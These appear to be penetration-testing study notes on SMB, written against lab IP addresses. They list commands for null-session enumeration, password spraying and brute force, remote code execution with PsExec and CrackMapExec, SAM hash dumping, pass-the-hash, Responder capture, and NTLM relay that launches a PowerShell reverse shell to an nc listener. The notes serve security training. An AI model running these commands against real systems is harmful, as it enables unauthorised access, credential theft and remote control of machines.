>Server Message Block (SMB) is a communication protocol created for providing shared access to files and printers across nodes on a network. Initially, it was designed to run on top of NetBIOS over TCP/IP (NBT) using TCP port `139` and UDP ports `137` and `138`. However, with Windows 2000, Microsoft added the option to run SMB directly over TCP/IP on port `445` without the extra NetBIOS layer. Nowadays, modern Windows operating systems use SMB over TCP but still support the NetBIOS implementation as a failover.

>Samba is a Unix/Linux-based open-source implementation of the SMB protocol. It also allows Linux/Unix servers and Windows clients to use the same SMB services.

---


## Enumeration


```
$ sudo nmap 10.129.14.128 -sV -sC -p139,445
```

#nmap #smb 


## Misconfigurations

SMB can be configured not to require authentication, which is often called a `null session`. Instead, we can log in to a system with no username or password.
#### Anonymous Authentication

>If we find an SMB server that does not require a username and password or find valid credentials, we can get a list of shares, usernames, groups, permissions, policies, services, etc. Most tools that interact with SMB allow null session connectivity, including `smbclient`, `smbmap`, `rpcclient`, or `enum4linux`. Let's explore how we can interact with file shares and RPC using null authentication.

#### File Share

```
$ smbclient -N -L //10.129.14.128
```

```
$ smbmap -H 10.129.14.128
```

		Using `smbmap` with the `-r` or `-R` (recursive) option, one can browse the directories:

```
$ smbmap -H 10.129.14.128 -r notes
```

```
$ smbmap -H 10.129.14.128 --download "notes\note.txt"
```

```
$ smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
```

#smb #smbmap 
#### Remote Procedure Call (RPC)

>We can use the `rpcclient` tool with a null session to enumerate a workstation or Domain Controller.

```
$ rpcclient -U'%' 10.10.110.17
```
#rpcclient #anonymous

>`Enum4linux` is another utility that supports null sessions, and it utilizes `nmblookup`, `net`, `rpcclient`, and `smbclient` to automate some common enumeration from SMB targets such as:


```
$ ./enum4linux-ng.py 10.10.11.45 -A -C
```

#enum4linux



## Protocol Specifics Attacks

>If a null session is not enabled, we will need credentials to interact with the SMB protocol. Two common ways to obtain credentials are [brute forcing](https://en.wikipedia.org/wiki/Brute-force_attack) and [password spraying](https://owasp.org/www-community/attacks/Password_Spraying_Attack).


```
$ crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
```
#crackmapexec #smb #passwordspray

`--continue-on-success` 
`--local-auth` 

```
$ crackmapexec smb 10.10.110.17 -u user.list -p password.list --local-auth
```
#crackmapexec #smb #bruteforce 
#### SMB
>Linux and Windows SMB servers provide different attack paths. Usually, we will only get access to the file system, abuse privileges, or exploit known vulnerabilities in a Linux environment, as we will discuss later in this section. However, in Windows, the attack surface is more significant.

#### Remote Code Execution (RCE)

>Sysinternals featured several freeware tools to administer and monitor computers running Microsoft Windows. The software can now be found on the [Microsoft website](https://docs.microsoft.com/en-us/sysinternals/). One of those freeware tools to administer remote systems is PsExec.

>[PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) is a tool that lets us execute processes on other systems, complete with full interactivity for console applications, without having to install client software manually. It works because it has a Windows service image inside of its executable. It takes this service and deploys it to the admin$ share (by default) on the remote machine. It then uses the DCE/RPC interface over SMB to access the Windows Service Control Manager API. Next, it starts the PSExec service on the remote machine. The PSExec service then creates a [named pipe](https://docs.microsoft.com/en-us/windows/win32/ipc/named-pipes) that can send commands to the system.


#### Impacket PsExec

>To use `impacket-psexec`, we need to provide the domain/username, the password, and the IP address of our target machine. For more detailed information we can use impacket help:

```
$ impacket-psexec administrator:'Password123!'@10.10.110.17
```
#impacket #impacket_psexec #psexec #smb 

#### CrackMapExec
```
$ crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```
#crackmapexec #smb  

**Note:** If the`--exec-method` is not defined, CrackMapExec will try to execute the atexec method, if it fails you can try to specify the `--exec-method` smbexec.

#### Enumerating Logged-on Users

>Imagine we are in a network with multiple machines. Some of them share the same local administrator account. In this case, we could use `CrackMapExec` to enumerate logged-on users on all machines within the same network `10.10.110.17/24`, which speeds up our enumeration process.

```
$ crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```
#crackmapexec #smb 
#### Extract Hashes from SAM Database

>The Security Account Manager (SAM) is a database file that stores users' passwords. It can be used to authenticate local and remote users. If we get administrative privileges on a machine, we can extract the SAM database hashes for different purposes:


		Extract Hashes from SAM Database
```
$ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```

		Pass-the-Hash (PtH)
```
$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```

		Forced Authentication Attacks
```
$ responder -I <interface name>
```

		  Forced Authentication Attacks
```shell-session
$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

		Forced Authentication Attacks
```
$ cat /etc/responder/Responder.conf | grep 'SMB ='
```

		Forced Authentication Attacks
```
$ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
```
#crackmapexec #smb #hashcat #smb2support #grep #pth #sam #responder #impacket-ntlmrelayx

>We can create a PowerShell reverse shell using [https://www.revshells.com/](https://www.revshells.com/), set our machine IP address, port, and the option Powershell #3 (Base64).

```
$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABjAGw....'
```

```
$ nc -lvnp 9001
```

#impacket-ntlmrelayx #nc #powershell 
